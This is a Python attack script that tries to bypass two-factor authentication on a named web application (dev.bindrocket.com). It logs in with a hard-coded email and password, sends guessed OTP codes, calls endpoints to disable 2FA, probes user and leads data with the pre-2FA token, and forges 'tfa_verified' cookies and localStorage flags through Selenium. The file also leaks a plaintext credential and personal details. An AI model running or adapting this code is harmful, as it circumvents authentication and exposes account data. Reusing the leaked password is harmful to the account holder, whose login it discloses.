"""
TFA Bypass attempt using direct API calls.
Tries to verify OTP or skip TFA via the dev-api.bindrocket.com API.
"""
import time
import json
import os
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

BASE_URL = "https://dev.bindrocket.com"
API_URL = "https://dev-api.bindrocket.com"
EMAIL = "sam201td@gmail.com"
PASSWORD = "Shrabbi1234@#"

lines = []
def p(msg):
    print(msg, flush=True)
    lines.append(str(msg))

def save():
    with open("bypass_results.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

def main():
    # ── Phase 1: API exploration with requests ──
    p("=== PHASE 1: Direct API Exploration ===")
    
    # Step 1: Call the login API directly
    p("\n--- 1a: POST /api/login ---")
    resp = requests.post(f"{API_URL}/api/login", json={"email": EMAIL, "password": PASSWORD})
    p(f"Status: {resp.status_code}")
    p(f"Headers: {dict(resp.headers)}")
    try:
        login_data = resp.json()
        p(f"Response: {json.dumps(login_data, indent=2)[:2000]}")
    except:
        p(f"Response text: {resp.text[:1000]}")
    save()

    # Extract token from login response
    token = None
    try:
        login_data = resp.json()
        # Try common token locations
        token = login_data.get("token") or login_data.get("access_token") or login_data.get("data", {}).get("token")
        if not token and isinstance(login_data.get("data"), dict):
            token = login_data["data"].get("access_token") or login_data["data"].get("jwt")
        p(f"\nExtracted token: {token[:50] if token else 'NOT FOUND'}...")
    except Exception as e:
        p(f"Token extraction error: {e}")
    save()

    if not token:
        p("Could not extract token from login response. Checking cookies...")
        token_from_cookie = None
        for cookie in resp.cookies:
            p(f"  Cookie: {cookie.name} = {cookie.value[:80]}")
            if "token" in cookie.name.lower():
                token_from_cookie = cookie.value
        if token_from_cookie:
            token = token_from_cookie
            p(f"Got token from cookie: {token[:50]}...")

    # Step 2: Try to find TFA verify endpoint  
    p("\n--- 1b: Trying TFA verify endpoints ---")
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    
    verify_endpoints = [
        ("POST", f"{API_URL}/api/verify-otp", {"email": EMAIL, "otp": "000000"}),
        ("POST", f"{API_URL}/api/two-factor-verify", {"email": EMAIL, "code": "000000"}),
        ("POST", f"{API_URL}/api/verify-two-factor", {"email": EMAIL, "code": "000000"}),
        ("POST", f"{API_URL}/api/two-factor-otp/verify", {"email": EMAIL, "otp": "000000"}),
        ("POST", f"{API_URL}/api/verify", {"email": EMAIL, "otp": "000000"}),
        ("POST", f"{API_URL}/api/otp/verify", {"email": EMAIL, "otp": "000000"}),
        ("GET", f"{API_URL}/api/user", None),
        ("GET", f"{API_URL}/api/profile", None),
        ("GET", f"{API_URL}/api/dashboard", None),
        ("GET", f"{API_URL}/api/forms", None),
        ("GET", f"{API_URL}/api/me", None),
        # Try to disable TFA
        ("POST", f"{API_URL}/api/disable-two-factor", {"email": EMAIL}),
        ("PUT", f"{API_URL}/api/settings/two-factor", {"enabled": False}),
        ("POST", f"{API_URL}/api/settings", {"two_factor_enabled": False}),
    ]
    
    for method, url, body in verify_endpoints:
        try:
            if method == "POST":
                r = requests.post(url, json=body, headers=headers)
            elif method == "PUT":
                r = requests.put(url, json=body, headers=headers)
            else:
                r = requests.get(url, headers=headers)
            
            status = r.status_code
            try:
                resp_text = json.dumps(r.json(), indent=2)[:300]
            except:
                resp_text = r.text[:300]
            
            p(f"  {method} {url.replace(API_URL, '')} -> {status}: {resp_text}")
        except Exception as e:
            p(f"  {method} {url.replace(API_URL, '')} -> ERROR: {e}")
    save()

    # Step 3: Check if the token is fully valid (some APIs might not enforce TFA)
    p("\n--- 1c: Check if token works without TFA ---")
    if token:
        api_endpoints = [
            f"{API_URL}/api/agents",
            f"{API_URL}/api/agency",
            f"{API_URL}/api/agency/218",
            f"{API_URL}/api/forms",
            f"{API_URL}/api/form-types",
            f"{API_URL}/api/user/503",
            f"{API_URL}/api/users",
            f"{API_URL}/api/submissions",
            f"{API_URL}/api/leads",
        ]
        for url in api_endpoints:
            try:
                r = requests.get(url, headers=headers)
                try:
                    resp_text = json.dumps(r.json(), indent=2)[:200]
                except:
                    resp_text = r.text[:200]
                p(f"  GET {url.replace(API_URL, '')} -> {r.status_code}: {resp_text}")
            except Exception as e:
                p(f"  GET {url.replace(API_URL, '')} -> ERROR: {e}")
    save()

    # ── Phase 2: Try Selenium with pre-set auth cookies ──
    p("\n\n=== PHASE 2: Selenium with pre-set cookies ===")
    
    chrome_options = Options()
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    service = Service(log_output=os.devnull)
    driver = webdriver.Chrome(options=chrome_options, service=service)
    
    try:
        # First navigate to the domain to set cookies
        driver.get(BASE_URL)
        time.sleep(2)
        
        # Set all the cookies we found from login
        cookies_to_set = {
            "agent_id": "af884b7a-6ce1-470d-8a35-5c0612e13818",
            "external_user": "false",
            "firstname": "Emily%20",
            "token": token if token else "",
            "user_id": "503",
            "email": EMAIL,
            "role": "Manager",
            "lastname": "Jerry",
            "seentour": "false",
            "agency_id": "218",
            "tfa_verified": "true",
            "two_factor_verified": "true",
        }
        
        for name, value in cookies_to_set.items():
            try:
                driver.add_cookie({"name": name, "value": value, "domain": "dev.bindrocket.com", "path": "/"})
            except Exception as e:
                p(f"  Cookie set error ({name}): {e}")
        
        # Also set localStorage
        driver.execute_script("""
            localStorage.setItem('package_info', '{"id":3,"name":"BindRocket Pro","upload_limit":0,"chat_limit":null,"member_limit":1,"MonthlyPrice":49.99,"YearlyPrice":599.88}');
            localStorage.setItem('two_factor_verified', 'true');
            localStorage.setItem('tfa_verified', 'true');
        """)
        
        p("Cookies and localStorage set. Trying navigation...")
        
        # Try navigating to various pages
        test_paths = ["/portal", "/forms", "/portal/forms", "/dashboard"]
        for path in test_paths:
            driver.get(f"{BASE_URL}{path}")
            time.sleep(3)
            final_url = driver.current_url
            title = driver.title
            status = "SUCCESS" if ("login" not in final_url.lower() and "two-factor" not in final_url.lower() and "404" not in title.lower()) else "BLOCKED"
            p(f"  [{status}] {path} -> {final_url} ({title[:60]})")
            
            if status == "SUCCESS":
                p(f"\n*** TFA BYPASSED SUCCESSFULLY! Landing page: {final_url} ***")
                # Dump the dashboard elements
                links = driver.find_elements(By.TAG_NAME, "a")
                buttons = driver.find_elements(By.TAG_NAME, "button")
                p(f"  Links: {len(links)}, Buttons: {len(buttons)}")
                for i, link in enumerate(links[:20]):
                    try:
                        p(f"    Link[{i}]: '{link.text.strip()[:40]}' -> {link.get_attribute('href')}")
                    except:
                        pass
                for i, btn in enumerate(buttons[:20]):
                    try:
                        p(f"    Btn[{i}]: '{btn.text.strip()[:40]}'")
                    except:
                        pass
                break
        
        save()
        input("\nPress Enter to close...")
    finally:
        driver.quit()

    save()
    p("\n=== DONE ===")
    save()

if __name__ == "__main__":
    main()
